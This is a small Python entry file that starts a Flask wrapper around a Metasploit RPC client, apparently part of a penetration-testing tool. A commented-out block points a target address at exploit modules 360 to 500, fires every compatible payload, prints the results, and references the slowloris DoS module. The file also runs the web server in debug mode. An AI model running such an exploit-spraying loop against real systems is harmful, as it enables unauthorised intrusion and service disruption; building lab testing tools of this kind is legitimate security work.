from .flask_wrapper import flask_wrapper

from metasploit.api.connections import Metasploit
# from metasploit.api.metasploit_manager.module_executor import Auxiliary
#
#
# def results(test_client, uuid):
#     return test_client.call('module.results', [uuid])
#
# source_host = '18.189.7.230'
# # m = Metasploit(server=source_host, port=50000)
#
# target_host = '172.17.0.3'
# name = 'dos/http/slowloris'
# options = {'rhost': target_host}
# m = Auxiliary(source_host=source_host, target=target_host)
# result = []
# for e in m.exploits[360:500]:
#     try:
#         exploit = m.metasploit_client.modules.use('exploit', mname=e)
#         if 'RHOSTS' in exploit.options:
#             exploit['RHOSTS'] = target_host
#             for p in exploit.targetpayloads():
#                 res = exploit.execute(payload=p)
#                 if res['job_id'] and res['job_id'] in m.metasploit_client.jobs.list:
#                     print(results(test_client=m.metasploit_client, uuid=res['uuid']))
#                 print(m.metasploit_client.jobs.list)
#                 print(res)
#
#     except Exception as e:
#         print(e)
#
# print(m.exploits)

flask_wrapper.run(debug=True)
# FlaskAppWrapper().run(host='127.0.0.1', debug=True)
